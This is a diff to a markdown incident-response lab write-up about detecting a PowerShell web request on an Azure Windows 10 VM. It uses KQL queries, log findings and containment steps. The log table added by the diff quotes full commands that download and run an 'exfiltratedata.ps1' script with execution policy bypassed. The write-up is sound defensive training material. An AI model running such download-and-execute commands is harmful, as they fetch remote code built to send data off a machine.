@@ -1,4 +1,4 @@
-# Incident Response Lab: Detect Web-Request from Powershell.exe
+# Incident Response Scenario: Detect Web-Request from Powershell
 
 ## Platforms and Tools Used
 - Windows 10 Virtual Machines (Microsoft Azure)
@@ -21,6 +21,8 @@ DeviceProcessEvents
 | where InitiatingProcessCommandLine contains "Invoke-WebRequest"
 | order by TimeGenerated
 ```
+![_ir1](https://github.com/user-attachments/assets/1fab327c-eb1c-465a-99d7-83ac5688ca46)
+
 
 This query detected the following suspicious command:
 ```powershell
@@ -42,6 +44,10 @@ DeviceProcessEvents
 | project Timestamp, FileName, FolderPath, ProcessCommandLine
 | order by Timestamp
 ```
+
+![processquery](https://github.com/user-attachments/assets/e9197ad7-2365-4bbc-86fb-41a25c40ff57)
+
+
 **Findings:**
 
 **Note:** The placeholder `[TIMESTAMP]` represents generalized timestamps for repeated events. Refer to the screenshots for actual logs.
@@ -68,12 +74,16 @@ DeviceNetworkEvents
 | project Timestamp, ActionType, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessCommandLine
 | order by Timestamp
 ```
+
+![networkquery](https://github.com/user-attachments/assets/6fccbaf5-f771-4ba9-9805-e0baed7ed3de)
+
+
 **Findings:**
 | Timestamp          | ActionType       | RemoteIP          | RemotePort | RemoteUrl                                      | CommandLine                                           |
 |--------------------|------------------|-------------------|------------|------------------------------------------------|-----------------------------------------------------|
-| 8 Jan 2025 18:48:47 | ConnectionSuccess | 20.60.133.132     | 443        | https://sacyberrangedanger.blob.core.windows.net | powershell.exe -ExecutionPolicy Bypass -File ...    |
-| 8 Jan 2025 18:48:39 | ConnectionSuccess | 20.60.181.193     | 443        | https://sacyberrange00.blob.core.windows.net    | powershell.exe -ExecutionPolicy Bypass -File ...    |
-| 8 Jan 2025 18:48:35 | ConnectionSuccess | 185.199.109.133   | 443        | https://raw.githubusercontent.com              | powershell.exe -ExecutionPolicy Bypass -Command ... |
+| 8 Jan 2025 18:48:47 | ConnectionSuccess | 20.60.133.132     | 443        | https://sacyberrangedanger.blob.core.windows.net | powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1    |
+| 8 Jan 2025 18:48:39 | ConnectionSuccess | 20.60.181.193     | 443        | https://sacyberrange00.blob.core.windows.net    | powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1    |
+| 8 Jan 2025 18:48:35 | ConnectionSuccess | 185.199.109.133   | 443        | https://raw.githubusercontent.com              | powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1 |
 
 These logs showed repeated connections to external endpoints, strongly supporting the hypothesis of data exfiltration.
 
@@ -87,6 +97,9 @@ DeviceFileEvents
 | order by Timestamp desc
 ```
 **Findings:**
+
+![Filequery](https://github.com/user-attachments/assets/aba14b2e-9fbd-41aa-a33d-bfe771693a61)
+
 
 **Note:** The placeholder `[TIMESTAMP]` represents generalized timestamps for repeated events. Refer to the screenshots for actual logs.
 | Timestamps             | FileName                     | FolderPath                             | InitiatingProcessCommandLine                                          | ActionType |
@@ -103,7 +116,7 @@ These findings confirmed the repeated creation and renaming of ZIP files, consis
 ### Immediate Containment
 
 1. **Quarantine Affected Device**:
-   - Disconnected `ir-win10` from the network.
+   - Isolated `ir-win10` from the network with Defender for Endpoint.
 
 2. **Block Malicious IPs and URLs**:
    - Blocked the following IPs and domains in the firewall:
@@ -122,7 +135,6 @@ These findings confirmed the repeated creation and renaming of ZIP files, consis
 
 2. **Scan the System**:
    - Performed a full system scan using Microsoft Defender for Endpoint.
-   - Used Windows Defender Offline for deeper inspection.
 
 3. **Analyze Network Traffic**:
    - Inspected logs to confirm no sensitive data was exfiltrated.
